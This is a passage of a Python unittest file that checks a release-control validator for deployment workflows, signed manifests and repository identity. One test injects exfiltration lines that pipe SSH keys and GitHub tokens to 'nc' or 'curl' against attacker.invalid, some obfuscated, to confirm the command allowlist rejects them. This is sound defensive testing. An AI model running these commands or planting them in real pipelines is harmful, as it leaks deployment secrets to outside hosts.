                "      - name: Unexpected block command\n"
                "        shell: bash\n"
                "        run: |\n"
                "          true\n\n"
                "      - name: Deploy approved staging candidate",
            ),
            ("        shell: bash", "        shell: zsh"),
            ("        shell: bash\n", ""),
            ("        shell: bash", "        shell: bash\n        shell: bash"),
            ("        shell: bash", "        shell: bash -e {0}"),
        )
        for old, new in mutations:
            with self.subTest(new=new), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                self.mutate_workflow(root, old, new)
                with self.assertRaisesRegex(MODULE.PolicyError, "executable|shell"):
                    MODULE.validate_workflow_semantics(root)

    def test_deployment_shell_blocks_reject_appended_commands_and_exfiltration(self) -> None:
        mutations = (
            (
                '          echo "Staging deployment completed"',
                '          echo "Staging deployment completed"\n'
                '          printf \'%s\' "$DEPLOY_SSH_PRIVATE_KEY" | nc attacker.invalid 4444',
            ),
            (
                '          echo "Production deployment completed"',
                '          echo "Production deployment completed"; nc attacker.invalid 4444 '
                '<<<"$DEPLOY_KNOWN_HOSTS"',
            ),
            (
                "            --cosign cosign",
                "            --cosign cosign\n"
                '          command p\\rintf \'%s\' "$GH_TOKEN" | n\\c attacker.invalid 4444',
            ),
            (
                '          grep -qx \'RELEASE_DEPLOYMENT_SUCCEEDED\' "$stdout"',
                '          grep -qx \'RELEASE_DEPLOYMENT_SUCCEEDED\' "$stdout"\n'
                '          c\\url -X POST --data-binary @"$key" https://attacker.invalid',
            ),
            (
                '          rm -f -- "$report"',
                '          rm -f -- "$report"\n          true',
            ),
        )
        for old, new in mutations:
            with self.subTest(new=new), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                self.mutate_workflow(root, old, new)
                with self.assertRaisesRegex(MODULE.PolicyError, "finite command allowlist"):
                    MODULE.validate_workflow_semantics(root)

    def test_deploy_manifest_report_authenticity_mismatch_controls_cannot_be_reused(self) -> None:
        mutations = (
            (
                '          test "$(jq -er \'.releaseSetManifestSha256\' "$MANIFEST_PATH")" = "$release_set_manifest_sha256"',
                "          true",
            ),
            (
                '          test "$(jq -er \'.combinedIdentitySha256\' "$report")" = "$combined_identity_sha256"',
                '          test "$(jq -er \'.combinedIdentitySha256\' "$MANIFEST_PATH")" = "$combined_identity_sha256"',
            ),
            (
                '            --release-set-manifest-sha256 "${{ needs.gate.outputs.release_set_manifest_sha256 }}" \\',
                '            --release-set-manifest-sha256 "${{ needs.gate.outputs.combined_identity_sha256 }}" \\',
            ),
        )
        for old, new in mutations:
            with self.subTest(new=new), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                self.mutate_workflow(root, old, new)
                with self.assertRaisesRegex(
                    MODULE.PolicyError,
                    "authenticity request|authenticity bindings|byte digest|finite command allowlist",
                ):
                    MODULE.validate_workflow_semantics(root)

    def test_manifest_is_rejected_before_bootstrap(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            (root / "releases" / "rel-20260720t110000z-a1b2c3d4e5f6.json").write_text(
                "{}", encoding="utf-8"
            )
            with self.assertRaisesRegex(MODULE.PolicyError, "before bootstrap"):
                MODULE.validate_self_check(root)

    def test_completed_bootstrap_without_bundle_fails_end_to_end(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            bundle = root / "authenticity" / "authenticity-request.sigstore.json"
            bundle.unlink(missing_ok=True)
            self.assertFalse(bundle.exists() or bundle.is_symlink())
            policy_path = root / "release-control-policy.json"
            policy = json.loads(policy_path.read_text(encoding="utf-8"))
            policy["bootstrapComplete"] = True
            policy["authenticity"] = {
                "signingConfigured": True,
                "expectedCertificateIdentity": (
                    MODULE.verify_authenticity.EXPECTED_CERTIFICATE_IDENTITY
                ),
                "certificateOidcIssuer": MODULE.verify_authenticity.EXPECTED_ISSUER,
            }
            policy_path.write_text(json.dumps(policy), encoding="utf-8")
            with self.assertRaisesRegex(MODULE.PolicyError, "requires a committed"):
                MODULE.validate_self_check(root)

    def test_foreign_repository_identity_fails_end_to_end(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            policy_path = root / "release-control-policy.json"
            policy = json.loads(policy_path.read_text(encoding="utf-8"))
            policy["authenticity"]["signingConfigured"] = True
            policy["authenticity"]["expectedCertificateIdentity"] = (
                "https://github.com/foreign-owner/link-cdss-release-control/.github/"
                "workflows/sign-authenticity-request.yml@refs/heads/main"
            )
            policy_path.write_text(json.dumps(policy), encoding="utf-8")
            with self.assertRaisesRegex(
                MODULE.PolicyError, "configured public repository workflow"
            ):
                MODULE.validate_self_check(root)

    def test_configured_repository_validates_every_manifest(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            policy = {
                "schemaVersion": 1,
                "bootstrapComplete": True,
                "defaultBranch": "main",
                "maximumApprovalHours": 24,
                "authenticity": {
                    "signingConfigured": True,
                    "expectedCertificateIdentity": (
                        MODULE.verify_authenticity.EXPECTED_CERTIFICATE_IDENTITY
                    ),
                    "certificateOidcIssuer": "https://token.actions.githubusercontent.com",
                },
                "roleApprovers": {
                    "clinical-safety": ["clinical-reviewer"],
                    "security": ["security-reviewer"],
                    "operations": ["operations-reviewer"],
                },
            }
            (root / "release-control-policy.json").write_text(json.dumps(policy))
            (root / "authenticity" / "authenticity-request.sigstore.json").write_text(
                '{"mediaType":"test"}', encoding="utf-8"
            )
            release_id = "rel-20260720t110000z-a1b2c3d4e5f6"
            manifest = {
                "schemaVersion": 1,
                "releaseId": release_id,
                "environment": "staging",
                "sourceCommit": "a" * 40,
                "artifacts": {
                    "apiSha256": "b" * 64,
                    "collectorSha256": "c" * 64,
                    "alertmanagerSha256": "d" * 64,
                },
                "sourceReviewEvidenceSha256": "1" * 64,
                "clinicalSafetyEvidenceSha256": "2" * 64,
                "promotionEvidenceSha256": "e" * 64,
                "releaseSetManifestSha256": MODULE.verify_authenticity.EXPECTED_REQUEST[
                    "releaseSetManifestSha256"
                ],
                "combinedIdentitySha256": MODULE.verify_authenticity.EXPECTED_REQUEST[
                    "combinedIdentitySha256"
                ],
                "stagingManifestSha256": None,
                "approvalIssue": 91,
                "createdAt": "2026-07-19T10:00:00+00:00",
                "expiresAt": "2026-07-19T12:00:00+00:00",
            }
            path = root / "releases" / f"{release_id}.json"
            path.write_text(json.dumps(manifest))
            with mock.patch.object(MODULE.verify_authenticity, "verify_bundle"):
                MODULE.validate_self_check(root)
            manifest["unexpected"] = True
            path.write_text(json.dumps(manifest))
            with mock.patch.object(MODULE.verify_authenticity, "verify_bundle"):
                with self.assertRaisesRegex(MODULE.PolicyError, "manifest validation"):
                    MODULE.validate_self_check(root)


if __name__ == "__main__":
    unittest.main()
